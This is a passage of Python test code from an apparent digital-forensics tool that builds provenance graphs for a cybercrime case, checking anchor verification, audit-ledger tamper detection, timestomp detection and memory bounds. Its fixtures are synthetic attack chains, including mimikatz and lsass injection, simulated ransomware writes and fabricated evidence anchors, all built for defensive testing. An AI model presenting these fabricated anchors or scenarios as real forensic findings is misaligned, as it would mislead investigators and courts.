    with open(os.path.join(d, "bank_kyc_reply.txt"), "w", encoding="utf-8", newline="\n") as f:
        f.write(kyc)
    with open(os.path.join(d, "seizure_memo.txt"), "w", encoding="utf-8", newline="\n") as f:
        f.write(memo)
    items = [{"src": ["UPI_ACCOUNT", "rahul@okhdfc"], "dst": ["DEVICE", "android-handset"], "relation": "OBSERVED_ON",
              "document": "bank_kyc_reply.txt",
              "quote": "VPA rahul@okhdfc is device-bound to the handset seized under memo SZ-17 (IMEI 356789104512347)."},
             {"src": ["FILE", "apk:apk"], "dst": ["DEVICE", "android-handset"], "relation": "OBSERVED_ON",
              "document": "seizure_memo.txt",
              "quote": "APK sample (artifact apk) was extracted from the seized Android handset"}] + list(extra)
    path = os.path.join(d, "case_bindings.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(items, f, indent=2)
    return path


def _connected(story: Dict[str, Any]) -> bool:
    labels = set(story["nodes"])
    parent = {x: x for x in labels}

    def find(x):
        while parent[x] != x:
            parent[x] = parent[parent[x]]
            x = parent[x]
        return x

    links = story["steps"] + story["identity_bindings"]
    for s in links:
        if s["actor"] in parent and s["target"] in parent:
            parent[find(s["actor"])] = find(s["target"])
    return len({find(x) for x in labels}) <= 1 and len(links) == max(0, len(labels) - 1)


def _audit_regressions(workdir: str, case: str, gen: str, ctx: Dict[str, Any]) -> List[Tuple[str, str, bool, str]]:
    """Regression checks for each finding of the hostile audit of r1 (V1-V8)."""
    import gc
    import tracemalloc
    out: List[Tuple[str, str, bool, str]] = []
    T = _t("2026-10-14T06:00:00Z")
    rdir = os.path.join(workdir, "audit_regressions")
    os.makedirs(rdir, exist_ok=True)

    def r(rid: str, name: str, ok: Any, detail: str = "") -> None:
        out.append((rid, name, bool(ok), detail))

    def refused(g: TemporalProvenanceGraph, *args, **kw) -> Optional[str]:
        try:
            g.add_edge(*args, **kw)
            return None
        except ProvenanceError as exc:
            return str(exc)

    real = os.path.join(rdir, "evidence.bin")
    with open(real, "wb") as f:
        f.write(bytes(range(256)) * 16)
    good = {"source_file": "evidence.bin", "byte_offset": 64, "length": 32,
            "sha256": hashlib.sha256((bytes(range(256)) * 16)[64:96]).hexdigest(), "source_type": "TEST"}

    # R01  V2: verification is on by default; artifact: ids and missing files are refused
    gv = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, evidence_root=rdir)
    e_missing = refused(gv, ("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, _fake_anchor(1))
    e_art = refused(gv, ("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, dict(good, source_file=None, artifact_id="x"))
    e_bad = refused(gv, ("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, dict(good, sha256="0" * 64))
    e_ok = refused(gv, ("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, good)
    ga = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, artifact_paths={"x": real})
    e_art_ok = refused(ga, ("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, dict(good, source_file=None, artifact_id="x"))
    r("R01", "V2: anchors re-hashed by default; artifact: ids resolve only through artifact_paths",
      gv.verify_anchors and e_missing == "UNVERIFIABLE_SOURCE_FILE" and e_art == "UNVERIFIABLE_SOURCE_FILE"
      and e_bad == "ANCHOR_HASH_MISMATCH" and e_ok is None and e_art_ok is None,
      f"missing file: {e_missing}; unmapped artifact: {e_art}; wrong hash: {e_bad}")

    # R02  V2: secondary anchors are checked at ingest and re-read at export (counted in D1)
    e_sec = refused(gv, ("PROCESS", "a"), ("PROCESS", "c"), REL_SPAWNED, T + NS, good, 0.9,
                    secondary_anchors={"witness": dict(good, byte_offset=96)})
    copy = os.path.join(rdir, "witness.bin")
    with open(copy, "wb") as f:
        f.write(b"W" * 64)
    wit = {"source_file": "witness.bin", "byte_offset": 0, "length": 64, "sha256": hashlib.sha256(b"W" * 64).hexdigest(),
           "source_type": "TEST"}
    gs = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, evidence_root=rdir)
    gs.add_edge(("PROCESS", "a"), ("PROCESS", "c"), REL_SPAWNED, T, good, 0.9, secondary_anchors={"witness": wit})
    with open(copy, "r+b") as f:
        f.write(b"X")
    s2 = gs.export_storyline(gen, write=False)
    d1 = next(x for x in s2["defense_challenge_matrix"]["rows"] if x["id"] == "D1")
    sec_flag = s2["steps"][0]["secondary_anchors"]["witness"]["anchor_reverified"] if s2["steps"] else None
    r("R02", "V2: a tampered secondary anchor is refused, and a file altered after ingest re-opens D1",
      e_sec == "ANCHOR_HASH_MISMATCH" and sec_flag is False and d1["status"] == "OPEN" and "1/2" in d1["basis"]
      and any("not re-verified" in x for x in validate_storyline(s2)),
      f"ingest: {e_sec}; export after edit: witness anchor_reverified={sec_flag}; D1 {d1['status']}")

    # R03  V2: turning verification off is disclosed and fails the Section 63 validator
    gn = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, verify_anchors=False)
    gn.add_edge(("PROCESS", "a"), ("PROCESS", "b"), REL_SPAWNED, T, _fake_anchor(3), 0.9)
    sn = gn.export_storyline(gen, write=False)
    errs = validate_storyline(sn)
    d1n = next(x for x in sn["defense_challenge_matrix"]["rows"] if x["id"] == "D1")
    r("R03", "V2: verify_anchors=False is written into the output, keeps D1 OPEN and fails validation",
      sn["anchor_verification"] == "DISABLED" and d1n["status"] == "OPEN"
      and any("DISABLED" in w for w in sn["warnings"]) and any("verification disabled" in e for e in errs),
      "; ".join(errs[:2]))

    # R04  V2: Sector A bad-sector mask applies to ABSOLUTE_IN_FILE anchors and to $MFT / $J records
    cdir, exp = ctx["cdir"], ctx["exp"]
    if _sector_a is not None:
        n = exp["ntfs"]
        bad_sec = (n["mft_offset"] + 40 * 1024) // 4096
        vdir = os.path.join(rdir, "vault_bad")
        _sector_a.SutraEvidenceVault(case_id=case, output_dir=vdir).ingest_evidence(
            os.path.join(cdir, "victim_disk.img"), bad_sector_mask=[bad_sec])
        gq = TemporalProvenanceGraph(case, capacity=1024, output_dir=rdir, evidence_root=cdir)
        gq.ingest_evidence_manifest(os.path.join(vdir, SECTOR_A_MANIFEST))
        q = gq.ingest_ntfs(os.path.join(cdir, "victim_disk.img"), n["mft_offset"], n["mft_length"], n["usn_offset"],
                           n["usn_length"])
        qrec = gq.timestomp_report["quarantined_records"]
        e_abs = refused(gq, ("PROCESS", "a"), ("FILE", "b"), REL_WROTE_FILE, T,
                        {"source_file": "other_view.img", "byte_offset": bad_sec * 4096 + 8, "length": 16,
                         "sha256": "0" * 64, "source_type": "TEST", "offset_basis": "ABSOLUTE_IN_FILE"})
        r("R04", "V2: records and ABSOLUTE_IN_FILE anchors in a known-bad sector are quarantined, not analysed",
          [x["record"] for x in qrec] == [40, 41, 42, 43] and "C:\\Users\\Public\\a.exe" not in gq.timestomp_report["per_record"]
          and "C:\\Users\\Public\\s.ps1" in gq.timestomp_report["per_record"]
          and (e_abs or "").startswith("ANCHOR_IN_BAD_SECTOR") and q["quarantined"] == 4
          and any(x["action"] == "RECORD_QUARANTINED_BAD_SECTOR" for x in gq.audit.entries),
          f"sector {bad_sec} bad -> $MFT records 40-43 (one 4 KB sector) quarantined; ABSOLUTE_IN_FILE anchor: {e_abs}")
    else:
        r("R04", "V2: bad-sector quarantine", False, "Sector A not found")

    # R05  V2: audit ledger rooted in Sector A, HMAC-able, truncation detected by head + count
    led = AuditLedger(genesis="ab" * 32, key=b"examiner-key")
    for i in range(3):
        led.append({"action": "TEST", "i": i})
    full = AuditLedger.verify(led.entries, "ab" * 32, led.head, 3, b"examiner-key")
    cut = AuditLedger.verify(led.entries[:2], "ab" * 32, led.head, 3, b"examiner-key")
    reroot = AuditLedger.verify(led.entries, "0" * 64)
    wrongkey = AuditLedger.verify(led.entries, "ab" * 32, led.head, 3, b"other")
    story = ctx["story"]
    trunc = json.loads(json.dumps(story))
    trunc["audit_ledger"] = trunc["audit_ledger"][:-1]
    trunc["storyline_sha256"] = _sha256_hex(canonical_json({k: v for k, v in trunc.items()
                                                            if k not in ("storyline_sha256", "generated_utc")}))
    rooted = bool(story.get("sector_a_binding")) and story["audit_genesis"] == story["sector_a_binding"]["master_case_root_v3"]
    r("R05", "V2: audit ledger is exported, rooted in Sector A, HMAC-keyed, and truncation is caught",
      full and not cut and not reroot and not wrongkey and rooted and story["audit_ledger_count"] >= 1
      and validate_storyline(story) == [] and any("audit ledger" in e for e in validate_storyline(trunc)),
      f"{story['audit_ledger_count']} entries, head {story['audit_ledger_head_sha256'][:16]}; "
      f"truncated copy rejected by the validator")

    # R06-R08  V4: false positives
    ft = lambda s: ns_to_filetime(_t(s))
    eng = AntiTimestompEngine()
    base = {"byte_offset": 0, "length": 1024, "sha256": "0" * 64}
    late, early = ft("2026-10-10T10:00:00.1111111Z"), ft("2025-01-01T00:00:00.2222222Z")
    ri = dict(base, record_number=2, lsn=200, si={"B": early}, si_usn=0x900)
    rj = dict(base, record_number=1, lsn=100, si={"B": late}, si_usn=0x500)
    both = eng.invariant1_lsn_usn([ri, rj], {1: {"usn": 0x400}, 2: {"usn": 0x800}})
    mixed = eng.invariant1_lsn_usn([ri, rj], {2: {"usn": 0x800}})
    r("R06", "V4: Invariant 1 is PROVEN only when both files' USNs come from journal FILE_CREATE records",
      [f["grade"] for f in both] == ["PROVEN"] and [f["grade"] for f in mixed] == ["INDICATIVE"]
      and mixed[0]["reference_usn_basis"] == "SI_LAST_USN",
      "journal/journal -> PROVEN; journal vs $SI last-USN -> INDICATIVE")

    now = ft("2026-10-14T09:00:00.4567891Z")
    fat = parse_mft_record(build_mft_record(50, "holiday.jpg", 5,
                                            [now, ft("2024-06-01T10:20:30Z"), now, ft("2026-10-14T00:00:00Z")],
                                            [now] * 4, 0x100, 0x10), 0)
    rep_fat = eng.assess([fat])
    zipdos = [ft("2023-02-03T04:05:06Z")] * 2
    zf = parse_mft_record(build_mft_record(51, "invoice.pdf", 5, zipdos + [now, ft("2023-02-03T04:05:06Z")],
                                           [now] * 4, 0x100, 0x10), 0)
    rep_zip = eng.assess([zf])
    r("R07", "V4: FAT32 copies and zip extraction (whole-second $SI) stay INDICATIVE, never TIMESTOMPED",
      rep_fat["per_record"][50]["verdict"] == "BENIGN_COPY"
      and all(f["grade"] == "INDICATIVE" for f in rep_fat["findings"])
      and rep_zip["per_record"][51]["verdict"] in ("SUSPECT", "BENIGN_COPY")
      and all(f["grade"] == "INDICATIVE" for f in rep_zip["findings"]),
      f"FAT32 copy -> {rep_fat['per_record'][50]['verdict']}; zip-extracted (no journal) -> "
      f"{rep_zip['per_record'][51]['verdict']}")

    c = ft("2026-10-14T09:00:00.4567891Z")
    rec7 = build_mft_record(52, "setup.exe", 5, zipdos + [ft("2026-10-14T09:00:00.6000001Z"), zipdos[0]], [c] * 4,
                            0x100, 0x10)

    def journal(session_change: bool) -> Dict[str, Any]:
        bi_t = ft("2026-10-14T09:00:00.6000001Z") if session_change else ft("2026-10-14T09:07:00.6000001Z")
        ents = [(52 | (1 << 48), 5, c, USN_REASON_FILE_CREATE, "setup.exe"),
                (52 | (1 << 48), 5, ft("2026-10-14T09:00:00.5000001Z"), USN_REASON_DATA_EXTEND, "setup.exe")]
        if session_change:
            ents += [(52 | (1 << 48), 5, bi_t, USN_REASON_BASIC_INFO_CHANGE | USN_REASON_DATA_EXTEND, "setup.exe"),
                     (52 | (1 << 48), 5, ft("2026-10-14T09:00:00.7000001Z"), USN_REASON_CLOSE | USN_REASON_BASIC_INFO_CHANGE,
                      "setup.exe")]
        else:
            ents += [(52 | (1 << 48), 5, ft("2026-10-14T09:00:00.7000001Z"), USN_REASON_CLOSE | USN_REASON_DATA_EXTEND,
                      "setup.exe"),
                     (52 | (1 << 48), 5, bi_t, USN_REASON_BASIC_INFO_CHANGE, "setup.exe")]
        return parse_usn_journal(build_usn_stream(ents))

    v_arch = eng.assess([parse_mft_record(rec7, 0)], journal(True))
    v_stomp = eng.assess([parse_mft_record(rec7, 0)], journal(False))
    r("R08", "V4: 7-Zip-style extraction (times set inside the creation session) is not called a timestomp",
      v_arch["per_record"][52]["verdict"] == "ARCHIVE_EXTRACTION_OR_RESTORE"
      and v_stomp["per_record"][52]["verdict"] == "TIMESTOMPED",
      "same $MFT record: BASIC_INFO_CHANGE before first CLOSE -> ARCHIVE_EXTRACTION_OR_RESTORE; "
      "separate change 7 min later -> TIMESTOMPED")

    # R09  V3: the auditor's scenario; a connection after the payload ran is not used as a bound
    g9 = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, verify_anchors=False)
    k = [9000]

    def fa() -> Dict[str, Any]:
        k[0] += 1
        return _fake_anchor(k[0])

    g9.add_edge(("PROCESS", "explorer.exe#1"), ("PROCESS", "loader.exe#7"), REL_SPAWNED, T, fa(), 0.6)
    w9 = g9.add_edge(("PROCESS", "loader.exe#7"), ("FILE", "C:\\Temp\\drop.exe"), REL_WROTE_FILE,
                     _t("2019-03-01T00:00:00Z"), fa(), 0.6, meta={"payload_source_hosts": ["203.0.113.9"]})
    g9.add_edge(("PROCESS", "loader.exe#7"), ("PROCESS", "drop.exe#8"), REL_SPAWNED, T + 5 * NS, fa(), 0.6)
    g9.add_edge(("PROCESS", "loader.exe#7"), ("SOCKET", "203.0.113.9:443"), REL_CONNECTED_TO, T + 10 * NS, fa(), 0.6)
    g9.check_causality()
    n9 = g9.edge_meta[w9]["timestamp_repair"]
    a_meta = ctx["a_exe_meta"]
    r("R09", "V3: socket after the payload already ran is rejected; WROTE_FILE uses kernel journal time",
      n9["basis"] == "PARENT_PROCESS_CREATION" and n9["repaired_ns"] == T and "socket_not_used" in n9
      and n9["upper_bound_utc"] == ns_to_iso(T + 5 * NS)
      and a_meta.get("timestamp_source") == "KERNEL_USN_JOURNAL_FILE_CREATE",
      f"drop.exe: interval [{n9['repaired_utc'][11:19]}, {n9['upper_bound_utc'][11:19]}]; {n9['socket_not_used']}")

    # R10  V5: broker-to-broker injection (rundll32 -> lsass) splits lsass
    g10 = TemporalProvenanceGraph(case, capacity=64, output_dir=rdir, verify_anchors=False)
    g10.add_edge(("PROCESS", "wininit.exe"), ("PROCESS", "lsass.exe"), REL_SPAWNED, T - 3600 * NS, fa())
    g10.add_edge(("PROCESS", "rundll32.exe"), ("PROCESS", "lsass.exe"), REL_INJECTED_INTO, T, fa(), 0.95)
    g10.add_edge(("PROCESS", "lsass.exe"), ("SOCKET", "203.0.113.9:445"), REL_CONNECTED_TO, T + NS, fa(), 0.6)
    l2 = g10.entities.lookup("PROCESS", "lsass.exe", 2)
    after = [rr for _, rr in g10.arena.iter_edges() if rr[2] == REL_CONNECTED_TO]
    r("R10", "V5: a broker injecting into a broker (rundll32 -> lsass, score >= 0.8) still splits the target",
      l2 is not None and after and after[0][0] == l2,
      "lsass.exe[epoch_2] starts at the injection; its later connection binds to epoch_2")

    # R11  V5: ransomware on a broker's child and pre-capture compromise are not gated away
    g11 = TemporalProvenanceGraph(case, capacity=20_000, output_dir=rdir, verify_anchors=False)
    g11.add_edge(("PROCESS", "services.exe"), ("PROCESS", "svchost.exe"), REL_SPAWNED, T - 7200 * NS, fa())
    for i in range(1000):
        g11.add_edge(("PROCESS", "svchost.exe"), ("PROCESS", f"bg{i}.exe"), REL_SPAWNED, T - 3600 * NS + i * NS, fa(), 0.05)
    g11.add_edge(("PROCESS", "svchost.exe"), ("PROCESS", "locker.exe"), REL_SPAWNED, T, fa(), 0.9)
    for i in range(10_000):
        g11.add_edge(("PROCESS", "locker.exe"), ("FILE", f"C:\\Users\\rahul\\Documents\\f{i}.docx.locked"),
                     REL_WROTE_FILE, T + (i + 1) * 1000, fa(), 0.9)
    svc = g11.entities.lookup("PROCESS", "svchost.exe", 1)
    lk = g11.entities.lookup("PROCESS", "locker.exe")
    s11 = g11.export_storyline(gen, write=False)
    r("R11", "V5: 10,000 ransomware writes and a high-scoring broker child keep full weight",
      g11.supernode.gate_q16(svc, REL_SPAWNED, score_to_q16(0.9)) == Q16
      and g11.supernode.gate_q16(lk, REL_WROTE_FILE, score_to_q16(0.9)) == Q16
      and g11.supernode.gate_q16(svc, REL_SPAWNED, score_to_q16(0.05)) < Q16 // 8
      and "locker.exe" in s11["nodes"] and "svchost.exe[epoch_1]" in s11["nodes"]
      and sum(1 for s in s11["steps"] if s["relation"] == "WROTE_FILE") >= 10,
      f"storyline {len(s11['nodes'])} nodes: svchost -> locker.exe -> "
      f"{sum(1 for s in s11['steps'] if s['relation'] == 'WROTE_FILE')} encrypted files")
    g11.close()

    # R12  V7: integer-ns time encoding is exact next to 30 and 90 days
    enc = BijectiveTimeEncoder(d=8, dt_max_s=90 * 86400)
    pts = []
    for days in (30, 90):
        x = days * 86400 * NS
        pts += [x - 1, x] if days == 90 else [x - 1, x, x + 1]
    pts += [-p for p in pts] + [0, 1]
    vecs = {struct.pack(f"<{enc.dim_ns}d", *enc.encode_ns(p)) for p in pts}
    exact = all(enc.decode_ns(enc.encode_ns(p)) == p for p in pts)
    r("R12", "V7: neighbours 1 ns apart at 30 and 90 days get distinct embeddings and decode exactly",
      exact and len(vecs) == len(set(pts)),
      f"{len(pts)} values, every one decodes to the exact nanosecond")

    # R13  V8: storyline digest does not depend on libm (log1p/log/exp/sin/cos shifted by 1 ulp)
    specs = []
    for i in range(200):
        specs.append((("PROCESS", f"q{i % 30}.exe"), ("PROCESS", f"q{(i * 11 + 5) % 30}.exe"), REL_SPAWNED,
                       T + (i % 13) * NS, _fake_anchor(20_000 + i), 0.6 if i % 4 == 0 else 0.1))

    def digest() -> str:
        gg = TemporalProvenanceGraph(case, capacity=1024, output_dir=rdir, verify_anchors=False)
        for sp in specs:
            gg.add_edge(*sp)
        return gg.export_storyline(gen, write=False)["storyline_sha256"]

    d0 = digest()
    saved = {n_: getattr(math, n_) for n_ in ("log1p", "log", "exp", "expm1", "sin", "cos")}
    try:
        for n_, fn in saved.items():
            setattr(math, n_, (lambda f: lambda x: math.nextafter(f(x), math.inf))(fn))
        d_up = digest()
        for n_, fn in saved.items():
            setattr(math, n_, (lambda f: lambda x: math.nextafter(f(x), -math.inf))(fn))
        d_dn = digest()
    finally:
        for n_, fn in saved.items():
            setattr(math, n_, fn)
    r("R13", "V8: storyline digest unchanged when every libm function is off by one ulp",
      d0 == d_up == d_dn, f"digest {d0[:16]} in all three runs")

    # R14  V1: evidence-based cross-domain joins connect contact, intrusion and money; D3 rebutted
    e2 = ctx.get("e2e_story")
    if e2:
        d3 = next(x for x in e2["defense_challenge_matrix"]["rows"] if x["id"] == "D3")
        d6 = next(x for x in e2["defense_challenge_matrix"]["rows"] if x["id"] == "D6")
        rels = {s["relation"] for s in e2["steps"]}
        bases = sorted({b.get("binding_basis") for b in e2["identity_bindings"] if b.get("binding_basis")})
        cb = ctx["case_bindings"]
        r("R14", "V1: one storyline from the WebRTC call to the mule wallet, joined only on evidence; D3 REBUTTED",
          _connected(e2) and {"IMPERSONATED_CALL", "UPI_TRANSFER", "CROSS_RAIL_BRIDGE"} <= rels
          and d3["status"] == "REBUTTED" and d6["status"] == "OPEN" and cb["bindings_added"] == 2
          and len(ctx["bad_bindings"]["bindings_refused"]) == 1 and len(e2["nodes"]) <= 25,
          f"{len(e2['steps'])} steps, {len(e2['nodes'])} nodes; joins: {', '.join(bases)}; "
          f"D6 stays OPEN (AnyDesk evidence)")
    else:
        r("R14", "V1: cross-domain storyline", False, "Sector A/B not found")

    # R15  V6: arrays, not tuples; full pipeline with an on-disk ledger stays bounded
    gc.collect()
    gc.disable()
    tracemalloc.start()
    g15 = TemporalProvenanceGraph(case, capacity=25_000, output_dir=rdir, verify_anchors=False,
                                  ledger_path=os.path.join(rdir, "ledger15.ring"))
    for i in range(40_000):
        g15.add_edge(("PROCESS", f"w{i % 500}"), ("SOCKET", f"10.1.{i % 250}.{i % 199}:443"), REL_CONNECTED_TO,
                     T + i * 1000, {"source_file": "big.pcap", "byte_offset": 24 + i * 70, "length": 70,
                                    "sha256": "cd" * 32, "source_type": "PCAP_PACKET_RECORD"}, 0.9 if i % 997 == 0 else 0.1)
    row_ptr, seqs = g15.arena.build_csr(len(g15.entities))
    g15.check_causality()
    s15 = g15.export_storyline(gen, write=False)
    a15 = g15.export_attack_graph(gen, write=False, max_edges=2000)
    _c, peak15 = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    gc.enable()
    r("R15", "V6: CSR in typed arrays; 40k edges through a 25k ring ingested, solved and exported in bounded memory",
      isinstance(row_ptr, array.array) and isinstance(seqs, array.array) and g15.ledger.nbytes_in_ram == 0
      and a15["statistics"]["edges_truncated"] == g15.arena.count - 2000 and len(s15["nodes"]) <= 25 and peak15 < 32 * 2 ** 20,
      f"peak {peak15 / 2 ** 20:.1f} MiB for {g15.arena.count:,} live edges incl. solver "
      f"({peak15 // g15.arena.count} B/edge); ledger on disk; export cut to the 2,000 most suspicious")
    g15.close()

    # R16  V6: entity table and pending maps are bounded
    g16 = TemporalProvenanceGraph(case, capacity=5_000, output_dir=rdir, verify_anchors=False)
    for i in range(60_000):
        g16.add_edge(("PROCESS", f"rand{i}.exe"), ("SOCKET", f"198.51.100.{i % 250}:{1024 + i}"), REL_CONNECTED_TO,
                     T + i, _fake_anchor(i), 0.1)
    ent_ok = g16.entities.live <= 2 * 5_000 + len(g16.entities.pinned) and len(g16.entities) <= 2 * 5_000 + 64
    sysmon = os.path.join(rdir, "flood_sysmon.jsonl")
    with open(sysmon, "w", encoding="utf-8") as f:
        for i in range(1_000):
            f.write(json.dumps({"EventID": 3, "UtcTime": "2026-10-14 06:00:00.000", "Image": "C:\\x\\a.exe",
                                "ProcessId": 1, "SourceIp": "10.0.0.1", "SourcePort": 10_000 + i,
                                "DestinationIp": "203.0.113.5", "DestinationPort": 443}) + "\n")
    gp = TemporalProvenanceGraph(case, capacity=4_096, output_dir=rdir, evidence_root=rdir)
    gp.PENDING_CAP = 100
    gp.ingest_sysmon_jsonl(sysmon)
    held = len(gp._pending_net)
    flushed = gp.arena.count
    gp.finalize_ingest()
    r("R16", "V6: one-off names do not grow the entity table; pending maps flush the oldest, never drop",
      ent_ok and held == 100 and flushed == 900 and gp.arena.count == 1_000,
      f"60,000 unique names -> {g16.entities.live:,} live / {len(g16.entities):,} slots; "
      f"1,000 connects with cap 100 -> 900 flushed early, 100 at finalize, 0 dropped")
    return out


def _self_test(workdir: str) -> int:
    import tracemalloc
    os.makedirs(workdir, exist_ok=True)
    case = "FIR-042/2026-CYBER"
    gen = "2026-10-20T15:00:00.000000000Z"
    results: Dict[int, Tuple[str, bool, str]] = {}

    def check(n: int, name: str, ok: Any, detail: str = "") -> None:
        results[n] = (name, bool(ok), detail)

    t_start = time.perf_counter()
    print("SUTRA-Trace Sector C self-test")
    print(f"  Sector A module: {'loaded' if _sector_a else 'NOT FOUND'}; Sector B module: {'loaded' if _sector_b else 'NOT FOUND'}")

    T = _t("2026-10-14T06:00:00Z")
    # 29 memory, measured first while the process is quiet; cyclic GC is paused so that
    # tracemalloc's bookkeeping does not dominate the run time.
    import gc
    gc.collect()
    gc.disable()
    tracemalloc.start()
    gm = TemporalProvenanceGraph(case, capacity=100_000, output_dir=workdir, verify_anchors=False)
    for i in range(100_000):
        gm.add_edge(("PROCESS", f"p{i % 1000}"), ("SOCKET", f"10.0.{i % 250}.{i % 200}:443"), REL_CONNECTED_TO,
                    T + i * 1000, {"source_file": "big.pcap", "byte_offset": 24 + i * 70, "length": 70,
                                   "sha256": "ab" * 32, "source_type": "PCAP_PACKET_RECORD"}, 0.1)
    _cur, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()
    gc.enable()
    check(29, "100,000 edges ingested in under 20 MB of RAM",
          gm.arena.count == 100_000 and peak < 20 * 1024 * 1024,
          f"peak {peak / 2**20:.2f} MiB (arena 3.05 MiB + ledger 4.58 MiB + entities)")
    gm.close()

    # 1-2 arena
    ar = CSRGraphArena(8)
    s0 = ar.append(0xDEADBEEF, 7, REL_UPI_TRANSFER, FLAG_SUSPICIOUS | FLAG_CROSS_RAIL, 1_792_000_000_123_456_789,
                   0x1234_5678_9ABC, 0xFFFF_FFFF)
    raw = bytes(ar.buf[0:32])
    check(1, "32-byte CSR arena packs and unpacks !IIHHQQI exactly",
          CSRGraphArena.RECORD_SIZE == 32 and struct.calcsize("!IIHHQQI") == 32
          and ar.get(s0) == (0xDEADBEEF, 7, REL_UPI_TRANSFER, FLAG_SUSPICIOUS | FLAG_CROSS_RAIL,
                             1_792_000_000_123_456_789, 0x1234_5678_9ABC, 0xFFFF_FFFF)
          and raw[:4] == b"\xde\xad\xbe\xef" and raw[8:10] == b"\x00\x04",
          f"record {raw.hex()[:24]}...")
    ar = CSRGraphArena(8)
    led = ProvenanceLedger(8)
    six = led.intern_source("t.bin")
    for i in range(20):
        q = ar.append(i, i + 1, REL_SPAWNED, 0, i + 1, i * 10, 0)
        led.put(q, six, i * 10, 5, hashlib.sha256(bytes([i])).hexdigest())
    wrap_ok = (ar.count == 8 and ar.oldest_seq == 12 and ar.evicted == 12 and ar.get(19)[0] == 19
               and led.get(12)["byte_offset"] == 120 and led.get(19)["sha256"] == hashlib.sha256(bytes([19])).hexdigest())
    try:
        ar.get(11)
        wrap_ok = False
    except KeyError:
        pass
    ar.evict_before(16)
    wrap_ok = wrap_ok and ar.oldest_seq == 15 and ar.count == 5
    disk = ProvenanceLedger(8, path=os.path.join(workdir, "ledger_ring.bin"))
    six = disk.intern_source("t.bin")
    for i in range(20):
        disk.put(i, six, i * 10, 5, hashlib.sha256(bytes([i])).hexdigest())
    wrap_ok = wrap_ok and disk.get(19)["byte_offset"] == 190 and disk.nbytes_in_ram == 0 \
        and os.path.getsize(os.path.join(workdir, "ledger_ring.bin")) == 8 * 48
    disk.close()
    big = CSRGraphArena(4_000_000)
    big_bytes = big.nbytes
    big_ok = big_bytes == 128_000_000 and big_bytes <= 128 * 1024 * 1024 and sys.getsizeof(big.buf) - big_bytes < 1024
    del big
    check(2, "Ring wraps around, evicts FIFO and 4M edges fit in 128 MB",
          wrap_ok and big_ok, f"4,000,000 edges = {big_bytes:,} bytes ({big_bytes / 2**20:.1f} MiB)")

    # 3-5 time encoding
    enc = BijectiveTimeEncoder(d=8, dt_max_s=90 * 86400)
    samples = sorted({0.0, 1e-6, 0.5, 1.0, 60.0, 3600.0, 86400.0, 21 * 86400.0, 89 * 86400.0})
    envs = [enc.encode(x)[-2] for x in samples]
    check(3, "Time encoding has fixed length 2d+2 and a strictly monotonic envelope",
          all(len(enc.encode(x)) == 18 for x in samples + [-5.0]) and all(a < b for a, b in zip(envs, envs[1:]))
          and enc.encode(-30.0)[-1] == -1.0)
    enc2 = BijectiveTimeEncoder(d=8, dt_max_s=90 * 86400)
    pack = lambda v: struct.pack(f"<{len(v)}d", *v)
    check(4, "Identical dt gives a bit-identical embedding",
          all(pack(enc.encode(x)) == pack(enc2.encode(x)) for x in (0.0, 7.25, 14 * 86400.0, -3600.0)))
    one = BijectiveTimeEncoder(d=1, dt_max_s=90 * 86400, omega_0=1.0)
    a1, a2 = 1000.0, 1000.0 + 2 * math.pi * 1000
    alias_harm = max(abs(x - y) for x, y in zip(one.harmonic_part(a1), one.harmonic_part(a2))) < 1e-6
    rng = random.Random(5)
    dts = [rng.uniform(-90 * 86400, 90 * 86400) for _ in range(2000)] + [7 * 86400.0, 14 * 86400.0, 21 * 86400.0]
    embs = {pack(enc.encode(x)) for x in dts}
    roundtrip = max(abs(enc.decode(enc.encode(x)) - x) / max(1.0, abs(x)) for x in dts)
    check(5, "Distinct dt never alias: sinusoid-only collision is broken by the envelope",
          alias_harm and one.encode(a1) != one.encode(a2) and abs(one.decode(one.encode(a2)) - a2) < 1e-6 * a2
          and len(embs) == len(set(dts)) and roundtrip < 1e-9,
          f"harmonic part of dt={a1:.0f}s and {a2:.0f}s identical; full embeddings differ; max decode error {roundtrip:.1e}")

    # 6-8 anti-supernode
    g = TemporalProvenanceGraph(case, capacity=10_000, output_dir=os.path.join(workdir, "epochs"), verify_anchors=False)
    T = _t("2026-10-14T06:00:00Z")
    k = 0

    def nxt() -> Dict[str, Any]:
        nonlocal k
        k += 1
        return _fake_anchor(k)

    g.add_edge(("PROCESS", "services.exe"), ("PROCESS", "svchost.exe"), REL_SPAWNED, T - 3600 * NS, nxt())
    for i in range(1000):
        g.add_edge(("PROCESS", "svchost.exe"), ("PROCESS", f"bg{i}.exe"), REL_SPAWNED, T - 3000 * NS + i * NS, nxt(), 0.05)
    late_child = g.add_edge(("PROCESS", "svchost.exe"), ("PROCESS", "dropper2.exe"), REL_SPAWNED, T + 120 * NS, nxt(), 0.9)
    g.add_edge(("PROCESS", "evil.exe"), ("PROCESS", "svchost.exe"), REL_INJECTED_INTO, T, nxt(), 0.95)
    child = g.add_edge(("PROCESS", "svchost.exe"), ("PROCESS", "mimikatz.exe"), REL_SPAWNED, T + 60 * NS, nxt(), 0.95)
    e1 = g.entities.lookup("PROCESS", "svchost.exe", 1)
    e2 = g.entities.lookup("PROCESS", "svchost.exe", 2)
    trans = [r for _, r in g.arena.iter_edges() if r[2] == REL_EPOCH_TRANSITION]
    check(6, "Tainted broker splits into svchost.exe[epoch_1] -> svchost.exe[epoch_2]",
          e1 is not None and e2 is not None and len(trans) == 1 and trans[0][0] == e1 and trans[0][1] == e2
          and g.entities.label(e2) == "svchost.exe[epoch_2]")
    pre = [r for _, r in g.arena.iter_edges() if r[2] == REL_SPAWNED and g.entities.names[r[1]].startswith("bg")]
    check(7, "Children after the taint bind only to the tainted epoch (also when they arrive first)",
          g.arena.get(child)[0] == e2 and g.arena.get(late_child)[0] == e2 and all(r[0] == e1 for r in pre)
          and g.arena.get(child)[3] & FLAG_TAINTED_EPOCH,
